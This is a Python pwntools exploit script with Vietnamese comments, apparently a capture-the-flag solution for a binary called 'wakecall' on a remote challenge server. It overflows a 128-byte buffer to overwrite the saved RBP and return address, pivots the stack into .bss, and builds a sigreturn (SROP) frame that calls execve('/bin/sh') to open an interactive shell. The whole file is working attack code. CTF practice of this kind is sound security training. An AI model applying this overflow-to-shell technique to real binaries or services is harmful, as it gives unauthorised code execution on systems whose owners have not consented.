# solve.py
from pwn import *

# Cài đặt context
context.binary = elf = ELF('./wakecall')
context.arch = 'amd64'

# --- CHẾ ĐỘ KẾT NỐI ---
# p = process()
p = remote('chall.v1t.site', 30211)

# --- Gadget và địa chỉ từ disassembly và ROPgadget ---
POP_RAX = 0x4011ef      # pop rax; ret
SYSCALL = 0x4011f1      # syscall
# Địa chỉ để quay lại ngay trước khi các đối số của read được thiết lập
MAIN_PRE_READ_ADDR = 0x401212

# --- Vùng nhớ có thể ghi ---
BSS_ADDR = elf.bss() + 0x200 # Chọn một địa chỉ an toàn trong .bss

log.info(f"Using writable .bss address: {hex(BSS_ADDR)}")

# --- Offset ---
padding = b'A' * 128

# === GIAI ĐOẠN 1: GHI ĐÈ RBP, QUAY LẠI READ ===

# Payload đầu tiên để ghi đè RBP và quay lại ngay trước lệnh read
fake_rbp = BSS_ADDR + 0x80 # RBP giả sẽ trỏ vào giữa vùng .bss của chúng ta
payload1 = flat([
    padding,
    fake_rbp,         # Ghi đè RBP đã lưu trên stack
    MAIN_PRE_READ_ADDR # Ghi đè RIP để nhảy lại trước lệnh read
])

p.recvline()
p.sendline(payload1)
log.info(f"Payload 1 sent. Hijacked RBP to {hex(fake_rbp)}.")
log.info("Program is now waiting for SROP payload to be written into .bss")

time.sleep(0.2) # Chờ server sẵn sàng

# === GIAI ĐOẠN 2: GỬI SROP PAYLOAD ĐÚNG CẤU TRÚC VÀO .BSS ===

# Địa chỉ bắt đầu của Sigreturn Frame, được tính toán chính xác
frame_addr = BSS_ADDR + 0xa0
# Địa chỉ của chuỗi "/bin/sh", đặt sau frame
binsh_addr = frame_addr + 0x100 # Thêm khoảng trống cho frame

# Xây dựng Sigreturn Frame
frame = SigreturnFrame()
frame.rax = constants.SYS_execve # 59
frame.rdi = binsh_addr      # RDI trỏ đến chuỗi "/bin/sh" trong .bss
frame.rsi = 0
frame.rdx = 0
frame.rip = SYSCALL         # RIP trỏ đến syscall để gọi execve
frame.rsp = binsh_addr + 8  # RSP trỏ đến vùng an toàn sau chuỗi

# Xây dựng payload thứ hai sẽ được ghi vào BSS_ADDR.
# Sử dụng flat() với offset để sắp xếp mọi thứ chính xác.
srop_payload = flat({
    # (Địa chỉ tương đối so với BSS_ADDR)

    # Vị trí mà `leave; ret` sẽ đọc
    0x80: b'B' * 8,          # Giá trị cho RBP mới (không quan trọng)
    0x88: POP_RAX,           # Giá trị cho RIP mới (bắt đầu ROP chain)

    # ROP chain để gọi sigreturn
    0x90: constants.SYS_rt_sigreturn, # Giá trị cho RAX (15)
    0x98: SYSCALL,           # Địa chỉ để `ret` của `pop rax` nhảy đến

    # Sigreturn Frame, bắt đầu tại 0xa0 (nơi RSP sẽ trỏ tới khi syscall được gọi)
    0xa0: bytes(frame),
    
    # Chuỗi "/bin/sh"
    (binsh_addr - BSS_ADDR): b'/bin/sh\x00'
})

# Gửi payload SROP
p.sendline(srop_payload)
log.info("SROP payload sent to .bss. Stack pivot and execution will follow.")

p.interactive()